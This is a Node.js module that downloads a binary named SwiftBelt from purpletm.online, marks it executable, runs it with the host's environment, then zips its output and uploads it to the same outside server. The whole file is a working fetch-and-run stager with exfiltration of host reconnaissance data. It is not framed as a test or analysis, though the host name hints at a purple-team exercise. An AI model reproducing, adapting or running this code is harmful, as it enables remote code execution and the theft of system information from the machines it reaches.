const { spawn } = require("child_process");
const fs = require("fs");
const path = require("path");
const https = require("https");
const http = require("http");

function sanitizePath(inputPath) {
    return path.normalize(inputPath).replace(/[^a-zA-Z0-9._\/-]/g, '_');
}

function validateUrl(url) {
    try {
        const parsed = new URL(url);
        return parsed.protocol === 'http:' || parsed.protocol === 'https:';
    } catch {
        return false;
    }
}

function downloadFile(url, outputPath) {
    return new Promise((resolve, reject) => {
        if (!validateUrl(url)) {
            reject(new Error("Invalid URL"));
            return;
        }

        const parsedUrl = new URL(url);
        const client = parsedUrl.protocol === 'https:' ? https : http;

        console.log(`📥 Downloading from: ${url}`);
        console.log(`💾 Saving to: ${outputPath}`);

        const request = client.get(url, (response) => {
            if (response.statusCode === 404) {
                reject(new Error(`File not found: ${url}`));
                return;
            }
            
            if (response.statusCode !== 200) {
                reject(new Error(`Download failed: ${response.statusCode} ${response.statusMessage}`));
                return;
            }

            const fileStream = fs.createWriteStream(outputPath, { mode: 0o755 });
            let downloadedBytes = 0;

            response.on('data', (chunk) => {
                downloadedBytes += chunk.length;
                fileStream.write(chunk);
            });

            response.on('end', () => {
                fileStream.end();
                
                if (downloadedBytes === 0) {
                    reject(new Error("Downloaded file is empty"));
                    return;
                }
                
                console.log(`✅ Download completed: ${downloadedBytes} bytes`);
                
                setTimeout(() => {
                    if (fs.existsSync(outputPath)) {
                        const stats = fs.statSync(outputPath);
                        console.log(`📁 File saved: ${outputPath} (${stats.size} bytes)`);
                        resolve(outputPath);
                    } else {
                        reject(new Error("File not found after download"));
                    }
                }, 100);
            });

            response.on('error', (error) => {
                fileStream.destroy();
                reject(error);
            });
        });

        request.on('error', (error) => {
            reject(error);
        });

        request.setTimeout(60000, () => {
            request.destroy();
            reject(new Error("Download timeout"));
        });
    });
}

function executeSwiftBelt(filePath, outputFile) {
    return new Promise((resolve, reject) => {
        if (!fs.existsSync(filePath)) {
            reject(new Error(`Binary not found: ${filePath}`));
            return;
        }

        const stats = fs.statSync(filePath);
        console.log(`🔍 Binary info: ${filePath} (${stats.size} bytes, mode: ${stats.mode.toString(8)})`);

        try {
            const fileBuffer = fs.readFileSync(filePath);
            const fileHeader = fileBuffer.slice(0, 16).toString('hex');
            console.log(`🔍 File header: ${fileHeader}`);
            
            const isExecutable = fileBuffer[0] === 0x7f && fileBuffer[1] === 0x45 && fileBuffer[2] === 0x4c && fileBuffer[3] === 0x46;
            console.log(`🔍 ELF executable: ${isExecutable}`);
        } catch (e) {
            console.log(`⚠️ Could not read file header: ${e.message}`);
        }

        console.log(`🚀 Executing SwiftBelt: ${filePath}`);
        console.log(`📄 Output to: ${outputFile}`);

        try {
            fs.chmodSync(filePath, 0o755);
        } catch (error) {
            console.log(`⚠️ Chmod failed: ${error.message}`);
        }

        const outputStream = fs.createWriteStream(outputFile, { mode: 0o600 });
        
        console.log(`🔍 Starting process...`);
        const child = spawn(filePath, [], {
            stdio: ['ignore', 'pipe', 'pipe'],
            env: process.env
        });

        console.log(`🔍 Process spawned with PID: ${child.pid}`);

        let stdout = '';
        let stderr = '';
        let hasOutput = false;

        child.stdout.on('data', (data) => {
            const chunk = data.toString();
            stdout += chunk;
            outputStream.write(chunk);
            hasOutput = true;
            console.log(`📤 STDOUT: ${chunk.trim()}`);
        });

        child.stderr.on('data', (data) => {
            const chunk = data.toString();
            stderr += chunk;
            outputStream.write(`[ERROR] ${chunk}`);
            hasOutput = true;
            console.log(`📤 STDERR: ${chunk.trim()}`);
        });

        child.on('error', (error) => {
            console.log(`❌ Process error: ${error.message}`);
            outputStream.end();
            reject(new Error(`Execution failed: ${error.message}`));
        });

        child.on('exit', (code, signal) => {
            console.log(`🔍 Process exited - Code: ${code}, Signal: ${signal}`);
            outputStream.end();
            
            if (!hasOutput) {
                const debugInfo = `SwiftBelt Debug Info:
Binary: ${filePath}
Size: ${stats.size} bytes
Exit Code: ${code}
Signal: ${signal}
Stdout: ${stdout || '(empty)'}
Stderr: ${stderr || '(empty)'}
Timestamp: ${new Date().toISOString()}
`;
                fs.writeFileSync(outputFile, debugInfo, { mode: 0o600 });
            }
            
            resolve({
                success: code === 0,
                exitCode: code,
                signal: signal,
                stdout: stdout,
                stderr: stderr,
                outputFile: outputFile
            });
        });

        setTimeout(() => {
            console.log(`⏰ Timeout reached, killing process`);
            child.kill('SIGTERM');
            outputStream.end();
            
            if (!hasOutput) {
                fs.writeFileSync(outputFile, `SwiftBelt execution timed out after 5 minutes\n`, { mode: 0o600 });
            }
            
            resolve({
                success: false,
                exitCode: null,
                timeout: true,
                outputFile: outputFile
            });
        }, 300000);
    });
}

function zipFile(filePath) {
    return new Promise((resolve) => {
        if (!fs.existsSync(filePath)) {
            console.log("⚠️ Output file not found, skipping zip");
            resolve(filePath);
            return;
        }

        const zipPath = `${filePath}.zip`;
        console.log(`📦 Creating zip archive: ${zipPath}`);
        
        const child = spawn('zip', ['-j', zipPath, filePath], {
            stdio: 'pipe'
        });

        child.on('exit', (code) => {
            if (code === 0 && fs.existsSync(zipPath)) {
                console.log(`✅ Archive created successfully`);
                resolve(zipPath);
            } else {
                console.log("⚠️ Zip creation failed, using original file");
                resolve(filePath);
            }
        });

        child.on('error', () => {
            console.log("⚠️ Zip error, using original file");
            resolve(filePath);
        });

        setTimeout(() => {
            child.kill('SIGTERM');
            resolve(filePath);
        }, 30000);
    });
}

async function uploadFile(filePath) {
    console.log(`📤 Uploading file: ${filePath}`);
    
    try {
        const uploadModule = require('./upload.js');
        const uploadUrl = "http://purpletm.online:4000";
        const result = await uploadModule(filePath, uploadUrl);
        console.log(`✅ Upload completed`);
        return "success";
    } catch (error) {
        console.error(`❌ Upload failed: ${error.message}`);
        return `Upload failed: ${error.message}`;
    }
}

module.exports = async function(options = {}) {
    const downloadUrl = options.url || "http://purpletm.online:7070/SwiftBelt";
    const targetDir = options.dir || "/tmp";
    const filename = options.filename || "SwiftBelt";
    const timestamp = Date.now();
    
    const sanitizedDir = sanitizePath(targetDir);
    const sanitizedFilename = sanitizePath(filename);
    const fullPath = path.join(sanitizedDir, sanitizedFilename);
    const outputFile = path.join(sanitizedDir, `swiftbelt_output_${timestamp}.txt`);

    console.log("🔧 Starting SwiftBelt deployment...");

    try {
        if (!fs.existsSync(sanitizedDir)) {
            fs.mkdirSync(sanitizedDir, { recursive: true, mode: 0o755 });
        }

        await downloadFile(downloadUrl, fullPath);
        const execResult = await executeSwiftBelt(fullPath, outputFile);

        if (fs.existsSync(outputFile)) {
            const uploadPath = await zipFile(outputFile);
            await uploadFile(uploadPath);

            console.log(`🔍 Final state:`);
            console.log(`  Binary: ${fullPath} (${fs.existsSync(fullPath) ? 'exists' : 'missing'})`);
            console.log(`  Output: ${outputFile} (${fs.existsSync(outputFile) ? 'exists' : 'missing'})`);
            console.log(`  Upload: ${uploadPath} (${fs.existsSync(uploadPath) ? 'exists' : 'missing'})`);
        }

        return {
            success: execResult.success,
            exitCode: execResult.exitCode,
            signal: execResult.signal,
            outputFile: outputFile,
            binaryPath: fullPath
        };

    } catch (error) {
        console.error(`❌ Deployment failed: ${error.message}`);
        throw error;
    }
};